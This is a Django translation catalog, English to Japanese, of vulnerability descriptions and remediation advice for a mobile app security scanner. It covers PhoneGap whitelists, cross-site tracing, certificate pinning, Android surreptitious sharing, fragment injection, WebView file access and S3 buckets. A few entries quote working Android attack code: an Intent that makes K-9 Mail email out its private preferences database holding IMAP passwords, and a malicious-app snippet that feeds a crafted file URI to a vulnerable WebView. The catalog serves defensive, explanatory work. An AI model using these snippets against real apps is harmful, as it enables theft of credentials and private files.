Repository: appknox/vendor
Catalog: ak_vendor/locale/*/LC_MESSAGES/django.po
Languages: ja

source: The PhoneGap whitelist was found to be allowing open access to all sites. Do not use wildcards (*) alone in whitelists, use fully qualified hostnames.
ja: PhoneGapのホワイトリストは、すべてのサイトにオープンアクセスを許可していることが判明しました。 ホワイトリストにワイルドカード（*）を単独で使用せずに、完全修飾ホスト名を使用してください。

source: An attacker can bypass the whitelisting mechanism and initiate connections to unauthorized remote servers. This could aid in further attacks.
ja: <p> 攻撃者はホワイトリスト化メカニズムを回避し、権利化されていないリモートサーバへの接続を初期化する可能性があります。 これは更なる攻撃を助長する可能性があります。</p>

source: Cross Site Tracing Vulnerabilities
ja: クロスサイトトレーシング(XST)の脆弱性

source: Are there Cross Site Tracing vulnerabilities present?
ja: クロスサイトトレーシング(XST)の脆弱性が存在していませんか？

source: No Cross Site Tracing vulnerabilities were found.
ja: クロスサイトトレーシング(XST)の脆弱性は見つかりませんでした。

source: A Cross-Site Tracing (XST) attack involves the use of Cross-site Scripting (XSS) and the TRACE or TRACK HTTP methods to be successfully leveraged in some scenarios to steal legitimate users' credentials. This attack technique was discovered by Jeremiah Grossman in 2003, in an attempt to bypass the HttpOnly tag that Microsoft introduced in Internet Explorer 6 SP1 to protect cookies from being accessed by JavaScript.
ja: クロスサイトトレーシング（XST）攻撃には、クロスサイトスクリプティング（XSS）とTRACEまたはTRACK HTTPメソッドを使用して、合法的なユーザーの資格情報を盗むために悪用されます。 この攻撃手法は、2003年にJeremiah Grossmanによって発見されました。 マイクロソフトがInternet Explorer 6 SP1で導入したHttpOnlyタグをバイパスして、JavaScriptによってCookieがアクセスされないようにしています。

source: One or more API requests were found to be susceptible to Cross Site Tracing vulnerabilies
ja: 1つまたは複数のAPIリクエストがクロスサイトトレーシング(XST)の脆弱性の影響を受けやすいことが判明しました。

source: The Cross-Site Tracing (XST) attack makes use of Cross-site Scripting (XSS) and the TRACE or TRACK HTTP methods. TRACE allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information. The TRACK method works in the same way but is specific to Microsoft's IIS web server. XST could be used as a method to steal user's cookies via Cross-site Scripting (XSS) even if the cookie has the `HttpOnly` flag set and/or exposes the user's Authorization header. Modern browsers now prevent TRACE requests being made via JavaScript, however, other ways of sending TRACE requests with browsers have been discovered, such as using Java.
ja: クロスサイトトレース（XST）攻撃では、クロスサイトスクリプティング（XSS）や、TRACEメソッドまたはTRACK HTTPメソッドを使用します。 TRACEを使用すると、クライアントはリクエストチェーンの相手側で何が受信されているかを確認し、そのデータをテストまたは診断情報に使用できます。 TRACKメソッドは同じ方法で動作しますが、MicrosoftのIIS Webサーバー固有です。 XSTは、Cookieに `HttpOnly`フラグが設定されている場合やユーザーのAuthorization ヘッダーが公開されている場合でも、クロスサイトスクリプティング（XSS）を介してユーザーのCookieを盗む方法として使用できます。 最新のブラウザでは、JavaScriptを使用してTRACE要求を行うことはできませんが、Javaを使用するなど、ブラウザーでTRACE要求を送信する他の方法が発見されています。

source: Response Body Contains Non-HTTPS Links
ja: レスポンスボディに含まれている非HTTPSのリンク

source: Does any response body contain non-https links?
ja: レスポンスボディに非HTTPSリンクは含まれていませんか?

source: Response body does not contain non-https links.
ja: レスポンスボディには非HTTPSリンクは含まれていません。

source: When a response is served over HTTPS, the connection with the web server is encrypted with TLS and is therefore safeguarded from sniffers and man-in-the-middle attacks. If the HTTPS response includes links to content that is retrieved through regular, cleartext HTTP, then the connection is only partially encrypted; the unencrypted content is accessible to sniffers and can be modified by man-in-the-middle attackers, so the connection is not safeguarded.
ja: 応答がHTTPS経由で提供されると、Webサーバーとの接続はTLSで暗号化されるため、スニッファーや中間者攻撃から保護されます。 HTTPSレスポンスに、通常の平文HTTPで取得されたコンテンツへのリンクが含まれている場合、接続は部分的にのみ暗号化されます。暗号化されていないコンテンツはスニッファーにアクセス可能で、中間者攻撃の攻撃者が変更できるため、接続は保護されません。

source: One or more of the API responses were found to contain URL links that do not employ HTTPS, ie. that use regular, cleartext HTTP.
ja: 1つまたは複数のAPIレスポンスにHTTPSを使用しないURLリンクが含まれていることが判明しました。すなわち、通常の平文のHTTPを使用しています。

source: PhoneGap Whitelist RegEx Bypass
ja: PhoneGapのホワイトリストのRegExバイパス

source: Can the PhoneGap whitelist be bypassed with a special RegEx
ja: PhoneGapのホワイトリストを特別な正規表現でバイパスすることはできますか？

source: The app does not allow whitelist to be bypassed, or PhoneGap is not used.
ja: このアプリケーションはホワイトリストをバイパスすることを許可していないか、もしくはPhoneGapは使用されていません。

source: Domain whitelisting is a security model that controls access to external domains over which the app has no control. The default security policy allows access to any site. Before moving your application to production, you should formulate a whitelist and allow access to specific network domains and subdomains.
ja: <p> ドメインのホワイトリストは、あなたのアプリケーションが制御できない外部のドメインへのアクセスを制御するセキュリティモデルです。 Cordova はどの外部サイトがアクセス可能か定義するために、構成可能なセキュリティポリシーを付与します。デフォルトでは、新しいアプリはどんなサイトへのアクセスも許可するよう構成されています。 アプリを本番移行する前に、ホワイトリストを生成し、特定のネットワークドメインとサブドメインのみアクセスを許可してください。</p>

source: If a regular expression is used within the whitelist, check if HTTPS can be bypassed with the regex.
ja: 正規表現がホワイトリスト内で使用されている場合は、HTTPSを正規表現でバイパスできるかどうかを確認してください。

source: Sending Address Book Data over Unencrypted Insecure Transport Layer
ja: 暗号化されていない安全でないトランスポート層を介したアドレス帳データの送信

source: Does the application sends sensitive data and Personal Identifiable Information from address book over the network
ja: アプリケーションはネットワーク経由でアドレス帳から機密データと個人識別情報を送信しますか？

source: The Application doesn't sends Address Book over Insecured Network
ja: アプリケーションは安全でないネットワーク経由でアドレス帳を送信しません。

source: Information stored in the Contacts list along with the private notes are store in clear text without any encryption. It was found that the application sends the data from address book over the network. Lack of encryption might result in leakage of information to third parties. Insecure Transport Layer Protection might allow Man-In-The-Middle Attack, via which the AddressBook data or Personal Identifiable Informations can be stolen
ja: 連絡先リストに格納されている情報はプライベートノートとともに暗号化されずに平文で保存されます。アプリケーションがアドレス帳からネットワーク経由でデータを送信することが判明しました。暗号化が不十分な場合、第三者に情報が漏洩する可能性があります。安全でないトランスポート層の保護により、中間者攻撃が可能になります。これにより、アドレス帳のデータや個人情報が盗まれる可能性があります。

source: If Contact List is sent via Network Layer, ensure that Proper Certificate Pinning and encryption is being used.
ja: 連絡先リストがネットワーク層経由で送信されている場合は、適切な証明書のピン設定と暗号化が使用されていることを確認してください。

source: In the event that a user (anonymous or verified) is able to aceess the Address Book of others, the business may experience: - Reputational Damage - Fraud - Information Theft
ja: ユーザ（匿名または検証済み）がアドレス帳にアクセスできる場合には、ビジネスには次のような問題が発生する可能性があります。: <ul> <li>風評被害</li> <li>詐欺</li> <li>情報盗難</li> </ul>

source: Disabled SSL CA Validation and Certificate Pinning
ja: 無効なSSL CAの検証と証明書のピン留め

source: Does the application has Certificate Pinning enabled
ja: アプリケーションは証明書のピン留めが有効になっていますか？

source: Application uses Certificate Pinning
ja: アプリケーションは証明書のピン留めを使用しています。

source: Certificate Pinning is the process of associating a host with their expected X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable. In this case, the advertised identity must match one of the elements in the pinset.
ja: 証明書のピン留めは、X509証明書または公開鍵に関連付けるプロセスです。証明書や、公開鍵がホストに対して既知または認識されると、証明書/公開鍵はホストに関連付けられます。複数の証明書/公開鍵が許容される場合、広告IDはピンセットの要素の1つと一致していなければなりません。

source: A host or service's certificate or public key can be added to an application at development time, or it can be added upon first encountering the certificate or public key. The former - adding at development time - is preferred since preloading the certificate or public key out of band usually means the attacker cannot taint the pin.
ja: ホストまたはサービスの証明書および公開鍵は、開発時にアプリケーションに追加することも、証明書/公開鍵に最初に必要になった時に追加することもできます。開発時に追加する方が推奨されます。証明書や公開鍵を帯域外にプリロードするのは、通常、攻撃者がピンを汚染させるとができないためです。

source: Surreptitious Sharing on Android
ja: Android における Surreptitious Sharing

source: Is your application vulnerable to Surreptitious Sharing?
ja: アプリケーションは Surreptitious Sharing に対して脆弱ですか？

source: Surreptitious Sharing might not be in use in this application
ja: このアプリケーションでは、Surreptitious Sharing が使用されていない可能性があります。

source: Many email and messaging apps on Android utilize the Intent API for sending files shared from other apps such as Android’s gallery. These Intents are standardized for sending and receiving content. Instead of sending entire files, such as videos, via this API, only URIs are exchanged pointing to the actual storage position. A vulnerability in this Intent API, which is present in many published communication apps allowing privilege escalation and data leakage. The main issue lies in the fact that apps cannot only access their private data directories using `Context.openFileOutput(String name, int mode)`, but also using _file_ URIs. While these URIs are normally used to access files on the SD card, via `file:///sdcard/paper.pdf` for example, they can also point to private files, e.g., `file:///data/data/com.example.app/files/paper.pdf`. If an app registers Intent Filters to support Android’s sharing API or defines custom Intents accepting URIs, they are potentially accepting _file_ URIs that could also point to their own private files. For apps facilitating communication, like email or messaging apps, this leads to what we call _Surreptitious Sharing_. Investigating the AOSP source code reveals that support for _file_ URIs using `Context.openFileOutput(String name, int mode)` (similar checks are present in `openAssetFileDescriptor`) was planned to be removed (see inline comments in `openInputStream` method in [ContentResolver] (https://goo.gl/Qyx84j)).
ja: Androidの多くの電子メールアプリとメッセージングアプリは、Androidのギャラリーなどの他のアプリから共有されたファイルを送信するためにIntent APIを利用しています。 これらのインテントは、コンテンツの送受信に標準化されています。 このAPIを介して動画などのファイル全体を送信する代わりに、実際の保存場所を指すURIだけが交換されます。このIntent APIの脆弱性は、特権の昇格やデータ漏洩を可能にする、公開された多くの通信アプリに存在します。 主な問題は、アプリが自分のプライベートデータにアクセスできるだけでなく `Context.openFileOutput（文字列名、intモード）`を使用するディレクトリ、 _file_ URIも使用します。 これらのURIは通常、SDカード上のファイルにアクセスするために使用されますが、例えば、file：/// sdcard / paper.pdf を介して、file：/// data / data / com.example.app / files / paper.pdf のようなプライベートファイルを指定することもできます。アプリがインテントフィルタを登録してAndroidの共有APIをサポートするか、URIを受け取るカスタムインテントを定義する場合、潜在的に自分自身のプライベートファイルを指す可能性のある_file_ URIを許容します。 電子メールやメッセージングアプリのようなコミュニケーションを容易にするアプリでは、これを「Surreptitious Sharing」と呼びます。 AOSPのソースコードを調べると、 `OpenOsetFileDescriptor`の中にContext.openFileOutput（String name、int mode） `を使った_file_ URIのサポートが削除される予定だったことが明らかになりました。（次の` openInputStream`メソッドのインラインコメントを参照してください。 [ContentResolver] (https://goo.gl/Qyx84j)).

source: This activity receives `android.intent.action.SEND` or `android.intent.action.SEND_MULTIPLE` intents and accepts a file-scheme as data URI `(file://...)` as parameter. It may be vulnerable to surreptitious sharing: a malicious application may set a URI referencing a private file of this application, and if no proper sanity checking is done this might be used to obtain the referenced file.
ja: このアクティビティは `android.intent.action.SEND`または `android.intent.action.SEND_MULTIPLE`は、ファイルスキームをデータURI`（file：// ...） `としてパラメータとして受け取ります。 非公開のアプリケーションのプライベートファイルを参照するURIを設定する可能性があり、適切なサニティーチェックが行われない場合、参照されたファイルを取得するために使用される可能性があります。

source: We provided a fix for app developers that checks with _fstat_ if a file is owned by the receiving app only and then prevents the opening of it. Due to the requirement of using _fstat_ our Java fix was only available for Android >= 5. We strongly recommend to use this library to fix the issue in your app: [https://github.com/appknox/SafeContentResolver](https://goo.gl/Gsz1bh).
ja: 私たちはアプリケーション開発者のために、受信側のアプリケーションだけがファイルを所有していて、ファイルを開くことを妨げている場合に「fstat」でチェックをする修正を提供しています。 「fstat」を使用する必要があるため、Javaの修正はAndroid> = 5でのみ利用可能です。 このライブラリを使用して、アプリケーションの問題を解決することを強くおすすめします。 [https://github.com/appknox/SafeContentResolver](https://goo.gl/Gsz1bh)

source: This example is intended to surreptitiously share IMAP passwords of K-9 Mail with an attacker. Please note that K-9 Mail serves only as an example, the issue has already been fixed in the current release and was present in many more apps The code required to execute this attack follows: Intent i = new Intent(); i.setComponent(new ComponentName("com.fsck.k9", "com.fsck.k9.activity.MessageCompose")); i.setAction(Intent.ACTION_SEND); i.setType("text/plain"); Uri uri = Uri.parse("file:///data/data/com.fsck.k9/databases/preferences_storage"); i.putExtra(Intent.EXTRA_STREAM, uri); i.putExtra(Intent.EXTRA_TEXT, "Hello World"); i.putExtra(Intent.EXTRA_EMAIL, new String[]{"support@company.com"}); i.putExtra(Intent.EXTRA_TEXT, "Dear support team,..."); i.putExtra(Intent.EXTRA_SUBJECT, "Bug Report"); This can be reproduced by connecting to a Android device via `adb shell` and then observing the output of `dmesg | grep avc`.
ja: この例は、K-9 MailのIMAPパスワードを不正に共有することを意図しています。 攻撃者と K-9メールは例としてのみ提供されていますが、 この問題は、現在のリリースで修正されており、より多くのアプリケーションに存在しています。 この攻撃を実行するために必要なコードは次のとおりです。 Intent i = new Intent(); i.setComponent(new ComponentName("com.fsck.k9", "com.fsck.k9.activity.MessageCompose")); i.setAction(Intent.ACTION_SEND); i.setType("text/plain"); Uri uri = Uri.parse("file:///data/data/com.fsck.k9/databases/preferences_storage"); i.putExtra(Intent.EXTRA_STREAM, uri); i.putExtra(Intent.EXTRA_TEXT, "Hello World"); i.putExtra(Intent.EXTRA_EMAIL, new String[]{"support@company.com"}); i.putExtra(Intent.EXTRA_TEXT, "Dear support team,..."); i.putExtra(Intent.EXTRA_SUBJECT, "Bug Report"); これは、 `adbシェル`を介してAndroidデバイスに接続し、 `dmesg | grep avc`を実行します。

source: Is your appl;ication vulnerable to Fragment Injection?
ja: アプリケーションは Fragment Injection に対して脆弱ですか？

source: Application is not vulnerable to Fragment Injection
ja: アプリケーションはFragment Injection に対して脆弱ではありません。

source: Android SDK offers a way for developers to present a [`Preferences activity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html). to users, allowing them to extend this abstract class and adapt it to their needs. This abstract class will parse the extra data fields received on a Intent, in particular the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` It is expected that the first field contains the `Fragment` class name and the second one contains the input bundle passed to the `Fragment`. Due to the fact that the `PreferenceActivity` uses reflection to load the fragment, this can lead to load an arbitrary class inside the package or the Android SDK. The loaded class runs in the context of the application that exports this activity.
ja: Android SDKは、開発者がユーザーに[`Preferences activity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html)を提示する方法を提供し、この抽象クラスを拡張してニーズに合わせることができます。 この抽象クラスは、特に次のふたつのインテントで受け取った余分なデータフィールドを解析します。 `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` 最初のフィールドには `Fragment`クラス名が含まれ、2番目のフィールドには` Fragment`に渡された入力バンドルが含まれていることが望まれます。 `PreferenceActivity`がフラグメントをロードするためにリフレクションを使用することで、パッケージまたはAndroid SDKの中に任意のクラスをロードすることにつながります。 ロードされたクラスは、このアクティビティをエクスポートするアプリケーションのコンテキストで実行されます。

source: With this vulnerability the attacker will be able to call non exported Activities or fragments inside the target application.
ja: この脆弱性により、攻撃者はエクスポートされていないアクティビティやターゲットアプリケーション内のフラグメントを呼び出すことができます。

source: In the event that a user (anonymous or verified) is able to execute over-privileged functionality, the business may experience: - Reputational Damage - Fraud - Information Theft
ja: ユーザー（匿名または検証済み）が特権を必要とする機能を実行できる場合、ビジネスには次のような問題が発生する可能性があります。 - 風評被害 - 詐欺 - 情報盗難

source: To mitigate this vulnerability, a new method called `isValidFragment` was added in Android 4.4 KitKat (API Level 19), that allows developers to override it and define which fragments are allowed to be used in this context.
ja: この脆弱性を軽減するために、Android 4.4 KitKat（APIレベル19）にisValidFragmentという新しいメソッドが追加されました。これにより、開発者はこのメソッドを使用してこのコンテキストで使用できるフラグメントを定義できます。

source: - Determine the minSDKVersion and maxSDKVersion to determine what will be the behaviour of the class. - Find exported Activities that extends the `PreferenceActivity` class. The following example shows a Activity that extends this activity : public class MyPreferences extends PreferenceActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState);
ja: - minSDKVersionとmaxSDKVersionを決定し、クラスの動作を決定します。 - `PreferenceActivity`クラスを拡張した、エクスポートされたアクティビティを検索します。 次の例は、このアクティビティを拡張するアクティビティを示しています。 public class MyPreferences extends PreferenceActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState);

source: Do not allow WebView to access sensitive local resource through file scheme
ja: WebViewが重要なローカルリソースにファイルスキームでアクセスすることを許可しないでください。

source: Are weak glass containers in use?
ja: weak glass containersを使用していますか？

source: Weak glass containers are not being used
ja: weak glass containersを使用していません。

source: The WebView class displays web pages as part of an activity layout. The behavior of a WebView object can be customized using the WebSettings object, which can be obtained from WebView.getSettings(). Major security concerns for WebView are about the `setJavaScriptEnabled()`, `setPluginState()`, and `setAllowFileAccess()` methods. When an activity has WebView embedded to display web pages, any application can create and send an Intent object with a given URI to the activity to request that a web page be displayed. WebView can recognize a variety of schemes, including the `file:scheme`. A malicious application may create and store a crafted content on its local storage area, make it accessible with MODE_WORLD_READABLE permission, and send the URI (using the `file:scheme`) of this content to a target activity.
ja: WebViewクラスは、Webページをアクティビティレイアウトの一部として表示します。 WebViewオブジェクトの動作は、WebView.getSettings（）から取得できるWebSettingsオブジェクトを使用してカスタマイズできます。 WebViewの主なセキュリティ上の懸念は、次のメソッドです。 `setJavaScriptEnabled（）` `setPluginState（）` `setAllowFileAccess（）` アクティビティにWebViewを埋め込んでWebページを表示すると、 どのようなアプリケーションでも、指定されたURIを持つインテントオブジェクトを作成してアクティビティに送信し、Webページの表示を要求することができます。 WebViewはさまざまなスキームを認識できますが、これには `file：scheme`も含まれます。 悪意のあるアプリケーションは、細工されたコンテンツを作成してローカルストレージ領域に保存し、MODE_WORLD_READABLE権限でアクセス可能にし、このコンテンツのURIを（target：file：schemeを使用して）ターゲットアクティビティに送信します。

source: Allowing WebView to access sensitive resources may result in information leaks.
ja: WebViewが機密リソースにアクセスできるようにすると、情報が漏洩する可能性があります。

source: Any URI received via an intent from outside a trust-boundary should be validated before rendering it with WebView. For example, the following code checks an received URI and uses it only when it is not a `file:scheme` URI. String intentUrl = getIntent().getStringExtra("url"); String localUrl = "about:blank"; if (!intentUrl.startsWith("file:")) { loadUrl = intentUrl; }
ja: トラストバウンダリ外からインテント経由で受信したURIは、WebViewでレンダリングする前に検証する必要があります。たとえば、次のコードは受信したURIをチェックし、それが `file：scheme` URIでない場合にのみ使用します。 String intentUrl = getIntent().getStringExtra("url"); String localUrl = "about:blank"; if (!intentUrl.startsWith("file:")) { loadUrl = intentUrl; }

source: The following noncompliant code example uses the WebView component with JavaScript enabled and processes any URI passed through Intent without any validation: public class MyBrowser extends Activity { @override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); WebView webView = (WebView) findViewById(R.id.webview); // turn on javascript WebSettings settings = webView.getSettings(); settings.setJavaScriptEnabled(true); String turl = getIntent().getStringExtra("URL"); webView.loadUrl(turl); } } This code shows how the vulnerability can be exploited: // Malicious application prepares some crafted HTML file, // places it on a local storage, makes accessible from // other applications. The following code sends an // intent to a target application (jp.vulnerable.android.app) // to make it access and process the malicious HTML file. String pkg = "jp.vulnerable.android.app"; String cls = pkg + ".DummyLauncherActivity"; String uri = "file:///[crafted HTML file]"; Intent intent = new Intent(); intent.setClassName(pkg, cls); intent.putExtra("url", uri); this.startActivity(intent);
ja: 次の違反コードの例では、JavaScriptを有効にしてWebViewコンポーネントを使用し、検証なしでIntentを介して渡されたURIを処理します。 public class MyBrowser extends Activity { @override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); WebView webView = (WebView) findViewById(R.id.webview); // turn on javascript WebSettings settings = webView.getSettings(); settings.setJavaScriptEnabled(true); String turl = getIntent().getStringExtra("URL"); webView.loadUrl(turl); } } このコードは、この脆弱性がどのように悪用されるかを示しています。 // Malicious application prepares some crafted HTML file, // places it on a local storage, makes accessible from // other applications. The following code sends an // intent to a target application (jp.vulnerable.android.app) // to make it access and process the malicious HTML file. String pkg = "jp.vulnerable.android.app"; String cls = pkg + ".DummyLauncherActivity"; String uri = "file:///[crafted HTML file]"; Intent intent = new Intent(); intent.setClassName(pkg, cls); intent.putExtra("url", uri); this.startActivity(intent);

source: * [JVN#59652356](https://jvn.jp/en/jp/JVN59652356/) Cybozu KUNAI for Android vulnerable in the WebView class * [JVN#99813183](https://jvn.jp/en/jp/JVN99813183/) Galapagos Browser vulnerable in the WebView class * [JVN#79301570](https://jvn.jp/en/jp/JVN79301570/) Angel Browser vulnerable in the WebView class * [JVN#77393797](https://jvn.jp/en/jp/JVN77393797/) Cybozu Live for Android vulnerable in the WebView class * [JVN#03015214](https://jvn.jp/en/jp/JVN03015214/) KUNAI Browser for Remote Service beta vulnerable in the WebView class * [JVN#46088915](https://jvn.jp/en/jp/JVN46088915/) Yahoo! Browser vulnerable in the WebView class
ja: * [JVN#59652356](https://jvn.jp/en/jp/JVN59652356/) Cybozu KUNAI for Android WebViewクラスの脆弱性 * [JVN#99813183](https://jvn.jp/en/jp/JVN99813183/) Galapagos Browser WebViewクラスの脆弱性 * [JVN#79301570](https://jvn.jp/en/jp/JVN79301570/) Angel Browser WebViewクラスの脆弱性 * [JVN#77393797](https://jvn.jp/en/jp/JVN77393797/) Cybozu Live for Android WebViewクラスの脆弱性 * [JVN#03015214](https://jvn.jp/en/jp/JVN03015214/) KUNAI Browser リモートベータ版 WebViewクラスの脆弱性 * [JVN#46088915](https://jvn.jp/en/jp/JVN46088915/) Yahoo! ブラウザ WebViewクラスの脆弱性

source: Misconfigured AWS S3 Buckets
ja: 設定されていないAWS S3バケット

source: Is the AWS S3 bucket misconfigured?
ja: AWS S3バケットの構成が誤っていますか？

source: No misconfigured AWS S3 buckets were found.
ja: 誤って構成されたAWS S3バケットは見つかりませんでした。

source: Amazon S3 is a web service offered by Amazon Web Services. It provides web service interfaces to securely store, retrieve any amount of data in the cloud into the buckets in form of objects. AWS also gives programmatic way to upload, read, write objects in the bucket through the AWS API Key. Following are the common misconfigurations leading to security issues. 1. The access key was unintentionally hardcoded or published 2. The bucket permissions were misconfigured.
ja: Amazon S3は、Amazon Web Servicesが提供するWebサービスです。 クラウド内の任意の量のデータをオブジェクトの形式でバケットに安全に格納し、取得するWebサービスインターフェイスを提供します。 また、AWS APIキーを使用してバケット内のオブジェクトをアップロード、読み込み、書き込みするプログラムのような方法も提供します。以下は、セキュリティ上の問題につながる一般的な誤設定です。 1.アクセスキーが意図せずハードコーディングまたは公開されている 2.バケットのアクセス許可が正しく設定されていない
